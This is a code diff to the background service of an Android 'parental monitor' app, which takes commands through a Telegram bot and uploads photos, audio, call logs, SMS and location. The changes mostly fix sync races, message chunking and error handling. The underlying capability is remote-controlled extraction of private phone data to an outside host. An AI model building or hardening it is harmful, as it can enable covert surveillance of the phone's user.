@@ -82,6 +82,7 @@ class MonitoringService : Service() {
     private var commandJob: Job? = null
     private var initialSyncJob: Job? = null
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
+    private val initialSyncLock = Any()
     @Volatile
     private var cachedBotToken = ""
     @Volatile
@@ -152,6 +153,27 @@ class MonitoringService : Service() {
         callLogRepository = CallLogRepository(this)
         messageQueue = MessageQueue.getInstance(this)
         cameraService = CameraService(this)
+        try {
+            val pending = preferencesManager.pendingMsgDrops
+            if (pending > 0) {
+                msgDropCount.addAndGet(pending)
+                synchronized(msgDropLock) {
+                    if (msgDropJob?.isActive != true) {
+                        msgDropJob = serviceScope.launch {
+                            try {
+                                delay(30_000L)
+                            } catch (_: Exception) {
+                            }
+                            try {
+                                flushMsgDropNotice()
+                            } catch (_: Exception) {
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (_: Exception) {
+        }
         restoreRingVolumeIfStuck()
     }
 
@@ -353,25 +375,35 @@ class MonitoringService : Service() {
             }
         }
 
-        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted) {
-            preferencesManager.setInitialSyncStartedSync(true)
-            initialSyncRunning.set(true)
-        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
-            initialSyncRunning.set(true)
-        }
-        startPeriodicLoops()
-        initialSyncJob = serviceScope.launch {
-            try {
-                if (initialSyncRunning.get()) {
-                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
-                    sendInitialData()
-                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
+        synchronized(initialSyncLock) {
+            val alreadyRunning = initialSyncRunning.get() && initialSyncJob?.isActive == true
+            if (!alreadyRunning) {
+                try {
+                    initialSyncJob?.cancel()
+                } catch (_: Exception) {
                 }
-            } catch (_: Exception) {
-            } finally {
                 initialSyncRunning.set(false)
+                if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted) {
+                    preferencesManager.setInitialSyncStartedSync(true)
+                }
+                if (!preferencesManager.initialSyncDone) {
+                    if (initialSyncRunning.compareAndSet(false, true)) {
+                        initialSyncJob = serviceScope.launch {
+                            val self = coroutineContext[Job]
+                            try {
+                                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
+                                sendInitialData()
+                                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
+                            } catch (_: Exception) {
+                            } finally {
+                                if (initialSyncJob === self) initialSyncRunning.set(false)
+                            }
+                        }
+                    }
+                }
             }
         }
+        startPeriodicLoops()
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
         try {
@@ -632,7 +664,7 @@ class MonitoringService : Service() {
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
         val offset = preferencesManager.lastUpdateId + 1
-        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30"
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22callback_query%22%5D"
 
         var response = try {
             TelegramClient.api.getUpdates(url)
@@ -648,7 +680,7 @@ class MonitoringService : Service() {
             }
             val (freshToken, freshChat) = sendCreds()
             if (freshToken.isNotEmpty() && freshToken != botToken) {
-                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30"
+                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22callback_query%22%5D"
                 response = try {
                     TelegramClient.api.getUpdates(retryUrl)
                 } catch (e: kotlinx.coroutines.CancellationException) {
@@ -726,6 +758,28 @@ class MonitoringService : Service() {
             try {
                 val callback = update.callbackQuery
                 if (callback != null) {
+                    val cbCommand = when (callback.data) {
+                        "photo" -> "/photo"
+                        "location" -> "/location"
+                        "lastcalls" -> "/lastcalls"
+                        "lastsms" -> "/lastsms"
+                        "battery" -> "/battery"
+                        "status" -> "/status"
+                        "stop" -> "/stop"
+                        "resume" -> "/resume"
+                        "camfront" -> "/camera"
+                        "camback" -> "/camera"
+                        "pause60" -> "/pause"
+                        else -> null
+                    }
+                    if (cbCommand != null && cbCommand in MUTATING_COMMANDS) {
+                        try {
+                            if (update.updateId > preferencesManager.lastUpdateId) {
+                                preferencesManager.setLastUpdateIdSync(update.updateId)
+                            }
+                        } catch (_: Exception) {
+                        }
+                    }
                     handleCallbackQuery(callback)
                 } else {
                     val message = update.message ?: update.editedMessage ?: update.channelPost ?: update.editedChannelPost
@@ -748,6 +802,14 @@ class MonitoringService : Service() {
                         if (command.startsWith("/")) {
                             val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
+                            if (command in MUTATING_COMMANDS) {
+                                try {
+                                    if (update.updateId > preferencesManager.lastUpdateId) {
+                                        preferencesManager.setLastUpdateIdSync(update.updateId)
+                                    }
+                                } catch (_: Exception) {
+                                }
+                            }
                             val wakeSeen = command == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
                             handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, wakeSeen, senderId)
                             if (wakeSeen) {
@@ -789,13 +851,13 @@ class MonitoringService : Service() {
         }
         val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
         val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
-        if (sender != chatId && originChat != chatId) {
+        val ownerOk = isOwner(sender)
+        if (sender != chatId && originChat != chatId && !ownerOk) {
             return
         }
-        val ownerOk = isOwner(sender)
+        answerCallback(query.id)
         if (dupCallback) return
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
-        answerCallback(query.id)
         val command = when (query.data) {
             "photo" -> "/photo"
             "location" -> "/location"
@@ -2134,46 +2196,21 @@ class MonitoringService : Service() {
         }
         var ok = true
         val failed = mutableListOf<String>()
-        val plain = if (message.contains('<')) message.replace(TAG_STRIP_REGEX, "") else message
-        val lines = plain.split("\n")
-        var current = StringBuilder()
-        for (line in lines) {
-            var rest = line
-            while (rest.length > 4000) {
-                if (current.isNotEmpty()) {
-                    if (!sendToTelegram(current.toString(), null, false)) {
-                        ok = false
-                        failed.add(current.toString())
-                    }
-                    delay(300)
-                    current = StringBuilder()
-                }
-                val cut = safeCut(rest, 4000)
-                if (!sendToTelegram(rest.substring(0, cut), null, false)) {
-                    ok = false
-                    failed.add(rest.substring(0, cut))
-                }
-                delay(300)
-                rest = rest.substring(cut)
-            }
-            if (current.length + rest.length + 1 > 4000) {
-                if (current.isNotEmpty()) {
-                    if (!sendToTelegram(current.toString(), null, false)) {
-                        ok = false
-                        failed.add(current.toString())
-                    }
-                    delay(300)
-                }
-                current = StringBuilder()
-            }
-            if (current.isNotEmpty()) current.append("\n")
-            current.append(rest)
+        val chunks = mutableListOf<String>()
+        var rest = message
+        while (rest.length > 4000) {
+            val cut = safeCut(rest, 4000)
+            chunks.add(rest.substring(0, cut))
+            rest = rest.substring(cut)
         }
-        if (current.isNotEmpty()) {
-            if (!sendToTelegram(current.toString(), replyMarkup, false)) {
+        chunks.add(rest)
+        for ((idx, chunk) in chunks.withIndex()) {
+            val markup = if (idx == chunks.lastIndex) replyMarkup else null
+            if (!sendToTelegram(chunk, markup, false)) {
                 ok = false
-                failed.add(current.toString())
+                failed.add(chunk)
             }
+            if (idx != chunks.lastIndex) delay(300)
         }
         if (!ok) {
             if (queueOnFail) {
@@ -2188,6 +2225,10 @@ class MonitoringService : Service() {
 
     private fun noteDroppedMessage() {
         msgDropCount.incrementAndGet()
+        try {
+            preferencesManager.setPendingMsgDropsSync(msgDropCount.get())
+        } catch (_: Exception) {
+        }
         synchronized(msgDropLock) {
             if (msgDropJob?.isActive == true) return
             msgDropJob = serviceScope.launch {
@@ -2207,6 +2248,10 @@ class MonitoringService : Service() {
 
     private fun flushMsgDropNotice() {
         val count = msgDropCount.getAndSet(0)
+        try {
+            preferencesManager.setPendingMsgDropsSync(0)
+        } catch (_: Exception) {
+        }
         if (count <= 0) return
         try {
             val text = if (count == 1) "Dropped 1 message rejected by Telegram (400)."
@@ -2215,6 +2260,10 @@ class MonitoringService : Service() {
             MessageScheduler.scheduleMessageSend(this@MonitoringService)
         } catch (_: Exception) {
             msgDropCount.addAndGet(count)
+            try {
+                preferencesManager.setPendingMsgDropsSync(msgDropCount.get())
+            } catch (_: Exception) {
+            }
         }
     }
 
@@ -2315,6 +2364,14 @@ class MonitoringService : Service() {
                     }
                     return false
                 }
+                if (NetworkUtils.isRightsLimited(goneBody)) {
+                    android.util.Log.w("MonitoringService", "Insufficient rights (400), queuing without auth block")
+                    if (queueOnFail) {
+                        messageQueue.addMessage(message)
+                        MessageScheduler.scheduleMessageSend(this)
+                    }
+                    return false
+                }
                 val plain = message.replace(TAG_STRIP_REGEX, "")
                 if (plain != message) {
                     try {
@@ -2351,6 +2408,33 @@ class MonitoringService : Service() {
                                 MessageScheduler.scheduleMessageSend(this)
                             }
                             return false
+                        } else if (fallbackResp.code() == 400) {
+                            val fbBody = try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null }
+                            if (NetworkUtils.isChatMissing(fbBody)) {
+                                try {
+                                    preferencesManager.credentialError = fallbackResp.code().toString()
+                                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                                } catch (_: Exception) {
+                                }
+                                if (queueOnFail) {
+                                    messageQueue.addMessage(plain)
+                                    MessageScheduler.scheduleMessageSend(this)
+                                }
+                                return false
+                            }
+                            if (NetworkUtils.isRightsLimited(fbBody)) {
+                                if (queueOnFail) {
+                                    messageQueue.addMessage(plain)
+                                    MessageScheduler.scheduleMessageSend(this)
+                                }
+                                return false
+                            }
+                            android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
+                            try {
+                                noteDroppedMessage()
+                            } catch (_: Exception) {
+                            }
+                            return true
                         } else {
                             android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                             try {
@@ -2489,52 +2573,9 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         try {
-            monitoringJob?.cancel()
+            teardownJobs()
         } catch (_: Exception) {
         }
-        try {
-            cameraJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            commandJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            initialSyncJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            ringJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            recordJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            smsJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            loopWatchdogJob?.cancel()
-        } catch (_: Exception) {
-        }
-        try {
-            watchdogJob?.cancel()
-        } catch (_: Exception) {
-        }
-        cameraBusy.set(false)
-        smsBusy.set(false)
-        ringBusy.set(false)
-        recordBusy.set(false)
-        audioFlushBusy.set(false)
-        photoFlushBusy.set(false)
-        try {
-            cameraService.forceReset()
-        } catch (_: Exception) {
-        }
-        initialSyncRunning.set(false)
         isRunning = false
         try {
             stopForeground(STOP_FOREGROUND_REMOVE)
@@ -2888,20 +2929,23 @@ class MonitoringService : Service() {
         startPeriodicLoops()
         startCommandPolling()
         try {
-            val syncWasActive = initialSyncJob?.isActive == true
-            try {
-                initialSyncJob?.cancel()
-            } catch (_: Exception) {
-            }
-            initialSyncRunning.set(false)
-            if (!preferencesManager.initialSyncDone && syncWasActive) {
-                initialSyncRunning.set(true)
-                initialSyncJob = serviceScope.launch {
-                    try {
-                        sendInitialData()
-                    } catch (_: Exception) {
-                    } finally {
-                        initialSyncRunning.set(false)
+            synchronized(initialSyncLock) {
+                try {
+                    initialSyncJob?.cancel()
+                } catch (_: Exception) {
+                }
+                initialSyncRunning.set(false)
+                if (!preferencesManager.initialSyncDone) {
+                    if (initialSyncRunning.compareAndSet(false, true)) {
+                        initialSyncJob = serviceScope.launch {
+                            val self = coroutineContext[Job]
+                            try {
+                                sendInitialData()
+                            } catch (_: Exception) {
+                            } finally {
+                                if (initialSyncJob === self) initialSyncRunning.set(false)
+                            }
+                        }
                     }
                 }
             }
@@ -3178,6 +3222,10 @@ class MonitoringService : Service() {
                     }
                     return MediaSendOutcome.KEPT
                 }
+                if (NetworkUtils.isRightsLimited(audioErr)) {
+                    android.util.Log.w("MonitoringService", "Audio rights limited (400), keeping file without auth block")
+                    return MediaSendOutcome.KEPT
+                }
                 android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                 deleteQuietly(audioFile)
                 return MediaSendOutcome.DROPPED
@@ -3347,12 +3395,13 @@ class MonitoringService : Service() {
         var photos = 0
         var audios = 0
         try {
-            for (file in cacheDir.walkTopDown()) {
+            val top = try { cacheDir.listFiles() } catch (_: Exception) { null } ?: emptyArray()
+            for (file in top) {
                 try {
                     if (file.isFile) {
                         bytes += file.length()
-                        if (file.parent == cacheDir.absolutePath && file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
-                        if (file.parent == cacheDir.absolutePath && file.name.startsWith("audio_") && file.name.endsWith(".m4a")) audios++
+                        if (file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
+                        if (file.name.startsWith("audio_") && file.name.endsWith(".m4a")) audios++
                     }
                 } catch (_: Exception) {
                 }
@@ -3432,6 +3481,10 @@ class MonitoringService : Service() {
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
                     } catch (_: Exception) {
                     }
+                    return MediaSendOutcome.KEPT
+                }
+                if (NetworkUtils.isRightsLimited(errorBody)) {
+                    android.util.Log.w("MonitoringService", "Photo rights limited (400), keeping file without auth block")
                     return MediaSendOutcome.KEPT
                 }
                 android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
